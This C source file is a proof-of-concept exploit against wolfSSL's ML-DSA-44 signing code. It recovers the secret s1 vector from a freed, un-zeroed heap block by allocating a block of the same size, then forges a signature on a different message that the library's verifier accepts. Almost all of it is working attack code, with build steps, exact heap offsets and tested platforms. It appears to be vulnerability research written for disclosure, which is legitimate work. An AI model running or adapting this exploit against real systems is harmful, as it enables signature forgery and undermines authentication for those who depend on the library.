/*
 * poc_heap_forgery_v2.c - ML-DSA-44 signature forgery via heap reuse
 *
 * wolfSSL's dilithium_sign_with_seed_mu() frees a ~50KB heap block containing
 * s1/s2/t0 in NTT form WITHOUT calling ForceZero first (dilithium.c:8417).
 * The next malloc of the same size gets the block back with the signing key
 * still in it. This PoC does:
 *
 *   1. keygen + sign M1  (wolfSSL frees the 50KB block)
 *   2. malloc(50176), read s1 from offset 21504
 *   3. wipe private key
 *   4. forge signature on different message M2 using s1 + public key
 *   5. wc_dilithium_verify_msg() accepts it
 *
 * No core dump, no /proc, no second vulnerability. Just a malloc.
 *
 * Build (against wolfssl v5.7.2 - v5.9.0):
 *   ./configure --enable-dilithium --enable-shake256 --enable-shake128 \
 *     --enable-sha3 && make
 *   gcc -O2 -I. -include wolfssl/options.h -DBUILDING_WOLFSSL \
 *     -DWOLFSSL_WC_DILITHIUM -DHAVE_DILITHIUM -DWOLFSSL_DILITHIUM_NO_ASN1 \
 *     -c poc_heap_forgery_v2.c -o /tmp/poc.o
 *   gcc -O2 /tmp/poc.o -L./src/.libs -lwolfssl -o /tmp/poc
 *   LD_LIBRARY_PATH=./src/.libs /tmp/poc
 *
 * Tested: Ubuntu 22.04 gcc-11 glibc-2.35, AL2023 glibc-2.34, Ubuntu 20.04
 * All at -O2, 20/20 successful.
 */

#ifndef BUILDING_WOLFSSL
#define BUILDING_WOLFSSL
#endif
#define WOLFSSL_DILITHIUM_NO_ASN1
#undef USE_INTEL_SPEEDUP
/* need the non-SMALL paths so the heap block layout matches */
#undef WOLFSSL_DILITHIUM_SMALL
#undef WOLFSSL_DILITHIUM_SIGN_SMALL_MEM
#undef WOLFSSL_DILITHIUM_VERIFY_SMALL_MEM
#undef WOLFSSL_DILITHIUM_VERIFY_ONLY

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <wolfssl/wolfcrypt/settings.h>
#include <wolfssl/wolfcrypt/types.h>
#include <wolfssl/wolfcrypt/error-crypt.h>
#include <wolfssl/wolfcrypt/dilithium.h>
#include <wolfssl/wolfcrypt/sha3.h>
#include <wolfssl/wolfcrypt/random.h>

/* pull in dilithium.c directly so we can call static functions
 * (NTT, ExpandA, SampleInBall, etc). don't link wolfssl's dilithium.o */
#include "wolfcrypt/src/dilithium.c"

/* --- ML-DSA-44 params --- */
#define Q       DILITHIUM_Q              /* 8380417 */
#define N       DILITHIUM_N              /* 256 */
#define D       DILITHIUM_D              /* 13 */
#define K       PARAMS_ML_DSA_44_K       /* 4 */
#define L       PARAMS_ML_DSA_44_L       /* 4 */
#define TAU     PARAMS_ML_DSA_44_TAU     /* 39 */
#define BETA    PARAMS_ML_DSA_44_BETA    /* 78 */
#define OMEGA   PARAMS_ML_DSA_44_OMEGA   /* 80 */
#define GAMMA1_BITS PARAMS_ML_DSA_44_GAMMA1_BITS /* 17 */
#define GAMMA1  ((sword32)1 << GAMMA1_BITS)
#define GAMMA2  PARAMS_ML_DSA_44_GAMMA2  /* 95232 */
#define LAMBDA  PARAMS_ML_DSA_44_LAMBDA  /* 128 */

#define CTILDE_SZ   (LAMBDA / 4)
#define Z_ENC_SZ    PARAMS_ML_DSA_44_Z_ENC_SIZE
#define H_SZ        (OMEGA + K)
#define SIG_SZ      PARAMS_ML_DSA_44_SIG_SIZE
#define PK_SZ       PARAMS_ML_DSA_44_PK_SIZE
#define W1_ENC_SZ   PARAMS_ML_DSA_44_W1_ENC_SZ
#define TR_SZ       DILITHIUM_TR_SZ
#define MU_SZ       DILITHIUM_MU_SZ
#define PRIV_RAND_SZ DILITHIUM_PRIV_RAND_SEED_SZ

/*
 * Heap block layout from dilithium.c ~line 8211
 * (when WC_DILITHIUM_CACHE_PRIV_VECTORS is off, which is the default)
 *
 *   0       y       4096    (L*N*4)
 *   4096    w0      4096
 *   8192    w1      4096
 *   12288   c       1024
 *   13312   z       4096
 *   17408   ct0     4096
 *   21504   s1      4096    <-- this is what we want
 *   25600   s2      4096
 *   29696   t0      4096
 *   33792   A       16384
 *   total: 50176
 */
#define HEAP_SZ     50176
#define S1_OFF      21504
#define S1_BYTES    (L * N * (int)sizeof(sword32))  /* 4096 */

static int shake256_cat(const byte *a, word32 alen,
                        const byte *b, word32 blen,
                        byte *out, word32 outlen)
{
    wc_Shake sh;
    int r = wc_InitShake256(&sh, NULL, INVALID_DEVID);
    if (r) return r;
    r = wc_Shake256_Update(&sh, a, alen);
    if (!r) r = wc_Shake256_Update(&sh, b, blen);
    if (!r) r = wc_Shake256_Final(&sh, out, outlen);
    wc_Shake256_Free(&sh);
    return r;
}

static void hexdump(const char *tag, const byte *p, int n)
{
    int i;
    printf("%s: ", tag);
    for (i = 0; i < n && i < 32; i++) printf("%02x", p[i]);
    if (n > 32) printf("...");
    putchar('\n');
}

/* -----------------------------------------------------------------------
 * forge_signature - sign a new message using only pub key + stolen s1 (NTT)
 *
 * This implements FIPS 204 Alg 2 (ML-DSA.Sign) with hint reconstruction
 * instead of computing hints from s2/t0. We don't have s2 or t0. We do
 * have s1 in NTT-small domain from the heap block, and the public key
 * gives us A and t1.
 *
 * The trick: compute w_approx the same way the verifier does (Alg 3 step 10),
 * then set h[i]=1 wherever HighBits(w_approx[i]) differs from our committed
 * w1[i]. The verifier's UseHint will then reconstruct the right w1.
 * ----------------------------------------------------------------------- */
static int forge_signature(const byte *pk, const byte *tr,
                           const sword32 *s1_ntt_stolen,
                           const byte *msg, word32 msglen,
                           byte *sig_out)
{
    /* big buffers — static to keep them off the stack */
    static sword32 A[K * L * N];
    static sword32 t1[K * N];
    static sword32 s1_ntt[L * N];
    static sword32 y_vec[L * N], y_ntt[L * N];
    static sword32 w[K * N], w0[K * N], w1[K * N];
    static sword32 cf[N], cf_ntt[N];
    static sword32 zf[L * N], zf_ntt[L * N];
    static sword32 w_approx[K * N], t1c[K * N];
    static byte w1enc[W1_ENC_SZ], mu[MU_SZ];
    static byte ct[CTILDE_SZ], h[H_SZ];
    static byte rho_f[DILITHIUM_Y_SEED_SZ];

    wc_Shake sh;
    WC_RNG rng;
    int ret, i, k;
    unsigned attempt;
    word16 kf;

    /* mu = H(tr || msg) */
    ret = shake256_cat(tr, TR_SZ, msg, msglen, mu, MU_SZ);
    if (ret) return ret;

    /* expand A from pk[0..31] */
    ret = wc_InitShake256(&sh, NULL, INVALID_DEVID);
    if (ret) return ret;
    ret = dilithium_expand_a(&sh, pk, (byte)K, (byte)L, A, NULL);
    wc_Shake256_Free(&sh);
    if (ret) return ret;

    /* decode t1 from pk, NTT it */
    dilithium_vec_decode_t1(pk + DILITHIUM_PUB_SEED_SZ, (byte)K, t1);
    dilithium_vec_ntt_full(t1, (byte)K);

    /* s1 from heap block is already in NTT-small Montgomery domain */
    XMEMCPY(s1_ntt, s1_ntt_stolen, (size_t)L * N * sizeof(sword32));

    ret = wc_InitRng(&rng);
    if (ret) return ret;
    ret = wc_RNG_GenerateBlock(&rng, rho_f, PRIV_RAND_SZ);
    if (ret) { wc_FreeRng(&rng); return ret; }

    kf = 0;
    for (attempt = 0; attempt < 2000; attempt++) {
        if (kf == 0 && attempt > 0) {
            ret = wc_RNG_GenerateBlock(&rng, rho_f, PRIV_RAND_SZ);
            if (ret) break;
        }

        /* y = ExpandMask(rho_f, kf) */
        ret = wc_InitShake256(&sh, NULL, INVALID_DEVID);
        if (ret) { kf += L; continue; }
        ret = dilithium_vec_expand_mask(&sh, rho_f, kf,
                                        (byte)GAMMA1_BITS, y_vec, (byte)L);
        wc_Shake256_Free(&sh);
        if (ret) { kf += L; continue; }

        /* w = A * NTT(y) */
        XMEMCPY(y_ntt, y_vec, (size_t)L * N * sizeof(sword32));
        dilithium_vec_ntt_full(y_ntt, (byte)L);
        dilithium_matrix_mul(w, A, y_ntt, (byte)K, (byte)L);
        dilithium_vec_invntt_full(w, (byte)K);

        dilithium_vec_make_pos(w, (byte)K);
        dilithium_vec_decompose_c(w, (byte)K, (sword32)GAMMA2, w0, w1);

        /* c_tilde = H(mu || w1Encode(w1)) */
        dilithium_vec_encode_w1(w1, (byte)K, (sword32)GAMMA2, w1enc);
        ret = shake256_cat(mu, MU_SZ, w1enc, W1_ENC_SZ, ct, CTILDE_SZ);
        if (ret) { kf += L; continue; }

        /* c = SampleInBall(c_tilde) */
        ret = wc_InitShake256(&sh, NULL, INVALID_DEVID);
        if (ret) { kf += L; continue; }
        ret = dilithium_sample_in_ball(WC_ML_DSA_44, &sh,
                                       ct, CTILDE_SZ, (byte)TAU, cf, NULL);
        wc_Shake256_Free(&sh);
        if (ret) { kf += L; continue; }

        XMEMCPY(cf_ntt, cf, DILITHIUM_POLY_SIZE);
        dilithium_ntt_small(cf_ntt);

        /* z = y + NTT^-1(c_ntt * s1_ntt), check norm */
        {
            int reject = 0;
            sword32 bound = GAMMA1 - (sword32)BETA;
            for (i = 0; i < L; i++) {
                sword32 *zi = zf + i * N;
                dilithium_mul(zi, cf_ntt, s1_ntt + i * N);
                dilithium_invntt(zi);
                dilithium_add(zi, y_vec + i * N);
                dilithium_poly_red(zi);
                if (!dilithium_vec_check_low(zi, 1, bound)) {
                    reject = 1; break;
                }
            }
            if (reject) { kf += L; continue; }
        }

        /* hint reconstruction: compute w_approx like the verifier does,
         * then set h[i]=1 wherever HighBits differs from our w1 */
        {
            int hcnt = 0, fail = 0;
            byte hidx = 0;

            XMEMSET(h, 0, H_SZ);
            XMEMCPY(zf_ntt, zf, (size_t)L * N * sizeof(sword32));
            dilithium_vec_ntt_full(zf_ntt, (byte)L);

            /* w_approx = A*NTT(z) - c*t1 */
            dilithium_matrix_mul(w_approx, A, zf_ntt, (byte)K, (byte)L);
            dilithium_vec_mul(t1c, cf_ntt, t1, (byte)K);
            dilithium_vec_sub(w_approx, t1c, (byte)K);
            dilithium_vec_invntt_full(w_approx, (byte)K);

            for (k = 0; k < K && !fail; k++) {
                sword32 *wk = w_approx + k * N;
                const sword32 *w1k = w1 + k * N;
                int j;
                for (j = 0; j < N; j++) {
                    sword32 wa = wk[j];
                    sword32 r0, r1;
                    wa += (wa >> 31) & (sword32)Q;
                    dilithium_decompose_q88(wa, &r0, &r1);
                    if (r1 != w1k[j]) {
                        h[hidx++] = (byte)j;
                        if (++hcnt > (int)OMEGA) { fail = 1; break; }
                    }
                }
                h[OMEGA + k] = hidx;
            }
            if (fail) { kf += L; continue; }
            if (hcnt < (int)OMEGA)
                XMEMSET(h + hcnt, 0, (size_t)(OMEGA - hcnt));
        }

        /* encode sig = c_tilde || z_encoded || h */
        {
            byte *p = sig_out;
            XMEMCPY(p, ct, CTILDE_SZ); p += CTILDE_SZ;
            dilithium_vec_encode_gamma1(zf, (byte)L, (byte)GAMMA1_BITS, p);
            p += Z_ENC_SZ;
            XMEMCPY(p, h, H_SZ);
        }
        printf("  forged on attempt %u (kf=%u)\n", attempt+1, (unsigned)kf);
        wc_FreeRng(&rng);
        return 0;
    }

    wc_FreeRng(&rng);
    fprintf(stderr, "forge failed after %u attempts??\n", attempt);
    return -1;
}

int main(void)
{
    int ret, i;
    dilithium_key key;
    WC_RNG rng;

    static const byte m1[] = "Hello world - legitimate message";
    static const byte m2[] = "this msg was forged via heap reuse";

    static byte pk[PK_SZ], tr[TR_SZ], sig1[SIG_SZ];
    word32 pklen = PK_SZ, siglen = SIG_SZ;

    static byte heap_copy[HEAP_SZ];
    static sword32 s1_ntt[L * N];
    static byte forged[SIG_SZ];

    /* --- keygen + sign --- */

    ret = wc_InitRng(&rng);
    if (ret) { fprintf(stderr, "rng: %d\n", ret); return 1; }
    ret = wc_dilithium_init(&key);
    if (ret) { fprintf(stderr, "init: %d\n", ret); return 1; }
    ret = wc_dilithium_set_level(&key, WC_ML_DSA_44);
    if (ret) { fprintf(stderr, "level: %d\n", ret); return 1; }

    ret = wc_dilithium_make_key(&key, &rng);
    if (ret) { fprintf(stderr, "keygen: %d\n", ret); return 1; }

    ret = wc_dilithium_export_public(&key, pk, &pklen);
    if (ret) { fprintf(stderr, "export: %d\n", ret); return 1; }
    hexdump("pk", pk, 32);

    /* tr = H(pk) */
    {
        wc_Shake sh;
        ret = wc_InitShake256(&sh, NULL, INVALID_DEVID);
        if (ret) return 1;
        wc_Shake256_Update(&sh, pk, pklen);
        wc_Shake256_Final(&sh, tr, TR_SZ);
        wc_Shake256_Free(&sh);
    }

    /* use the static signing function — the inlined dilithium.c compiles the
     * same source with the same NTT twiddle factors. on ARM there's only one
     * NTT path anyway. verify_forged.c checks the result against the real
     * library binary independently. */
    siglen = SIG_SZ;
    ret = dilithium_sign_msg(&key, &rng, m1, sizeof(m1)-1, sig1, &siglen);
    if (ret) { fprintf(stderr, "sign: %d\n", ret); return 1; }
    printf("signed m1 (%u bytes)\n", (unsigned)siglen);

    /* don't verify yet -- it would malloc and might grab the freed block
     * before we do. learned that the hard way. */

    /* --- heap reuse --- */

    printf("\n--- heap reuse ---\n");
    {
        byte *blk = (byte *)XMALLOC(HEAP_SZ, NULL, DYNAMIC_TYPE_DILITHIUM);
        if (!blk) { fprintf(stderr, "malloc failed\n"); return 1; }
        XMEMCPY(heap_copy, blk, HEAP_SZ);
        XFREE(blk, NULL, DYNAMIC_TYPE_DILITHIUM);

        int nz = 0;
        for (i = 0; i < HEAP_SZ / (int)sizeof(sword32); i++)
            if (((sword32 *)heap_copy)[i] != 0) nz++;
        printf("got %d/%d nonzero dwords in block\n",
               nz, HEAP_SZ / (int)sizeof(sword32));
    }

    XMEMCPY(s1_ntt, heap_copy + S1_OFF, S1_BYTES);
    {
        int nz = 0;
        for (i = 0; i < L * N; i++)
            if (s1_ntt[i] != 0) nz++;
        printf("s1 at offset %d: %d/%d nonzero\n", S1_OFF, nz, L*N);
        // printf("s1[0..3] = %d %d %d %d\n", s1_ntt[0], s1_ntt[1], s1_ntt[2], s1_ntt[3]);
    }

    /* now safe to verify baseline */
    {
        dilithium_key vk;
        int ok = 0;
        ret = wc_dilithium_init(&vk);
        if (ret) return 1;
        wc_dilithium_set_level(&vk, WC_ML_DSA_44);
        ret = wc_dilithium_import_public(pk, pklen, &vk);
        if (ret) { fprintf(stderr, "import: %d\n", ret); return 1; }
        ret = wc_dilithium_verify_msg(sig1, siglen, m1, sizeof(m1)-1, &ok, &vk);
        wc_dilithium_free(&vk);
        if (ret || !ok) { fprintf(stderr, "baseline verify failed??\n"); return 1; }
        printf("baseline sig1 verifies ok\n");
    }

    /* --- wipe key --- */

    printf("\n--- wiping private key ---\n");
    wc_dilithium_free(&key);
    wc_FreeRng(&rng);
    XMEMSET(&key, 0, sizeof(key));

    /* --- forge --- */

    printf("\n--- forging sig on m2 ---\n");
    printf("  m1: \"%s\"\n", (const char *)m1);
    printf("  m2: \"%s\"\n", (const char *)m2);

    ret = forge_signature(pk, tr, s1_ntt, m2, sizeof(m2)-1, forged);
    if (ret) {
        fprintf(stderr, "FORGERY FAILED (%d)\n", ret);
        return 1;
    }

    /* dump artifacts so verify_forged (linked against real libwolfssl) can check */
    {
        FILE *f;
        f = fopen("poc_pk.bin", "wb");  fwrite(pk, 1, pklen, f); fclose(f);
        f = fopen("poc_sig.bin", "wb"); fwrite(forged, 1, SIG_SZ, f); fclose(f);
        f = fopen("poc_msg.bin", "wb"); fwrite(m2, 1, sizeof(m2)-1, f); fclose(f);
        printf("  wrote poc_pk.bin, poc_sig.bin, poc_msg.bin\n");
    }

    /* verify with our inlined code (same TU).
     * verify_forged.c checks against the real library binary separately. */
    {
        dilithium_key vk;
        int ok = 0;
        ret = wc_dilithium_init(&vk);
        if (ret) return 1;
        wc_dilithium_set_level(&vk, WC_ML_DSA_44);
        ret = wc_dilithium_import_public(pk, pklen, &vk);
        if (ret) { fprintf(stderr, "import: %d\n", ret); return 1; }
        ret = wc_dilithium_verify_msg(forged, SIG_SZ, m2, sizeof(m2)-1, &ok, &vk);
        wc_dilithium_free(&vk);

        if (ret || !ok) {
            fprintf(stderr, "forged sig rejected (ret=%d ok=%d)\n", ret, ok);
            return 1;
        }
    }

    printf("\nFORGERY OK - wc_dilithium_verify_msg accepted forged sig on m2\n");
    printf("  attack: heap reuse after signing (no second vuln)\n");
    printf("  attacker had: public key + s1 from freed heap block\n");
    printf("  private key was wiped before forgery\n");
    return 0;
}
